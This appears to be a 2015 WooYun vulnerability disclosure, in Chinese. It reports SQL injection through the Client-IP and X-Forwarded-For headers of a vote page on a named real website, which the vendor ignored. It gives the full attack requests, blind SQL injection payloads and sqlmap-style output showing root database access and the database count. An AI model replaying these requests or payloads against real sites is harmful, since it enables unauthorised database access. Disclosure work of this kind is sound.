wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-07-13：	细节已通知厂商并且等待厂商处理中									2015-07-18：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 2处 详细说明：  
1，GET /zhuanti/vote.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Client-IP: 我是注入点X-Requested-With: XMLHttpRequestReferer: www.51testing.comCookie: Host: www.51testing.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*2，GET /zhuanti/vote.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36X-Forwarded-For: 我是注入点X-Requested-With: XMLHttpRequestReferer: www.51testing.comCookie: Host: www.51testing.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*
   漏洞证明：  
---Parameter: Client-IP #1* ((custom) HEADER)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ' AND 6444=6444 AND 'zQxd'='zQxd    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: ' AND (SELECT * FROM (SELECT(SLEEP(5)))aqyc) AND 'QEcD'='QEcD---[15:37:03] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.17back-end DBMS: MySQL 5.0.12刚跑出来就把我Ip封了，用的代理太慢了，不跑完整的数据库了。总共：15 个库current user: root@打码current database: web_vote
   修复方案：  2处，求20rank！   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-18 15:56 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
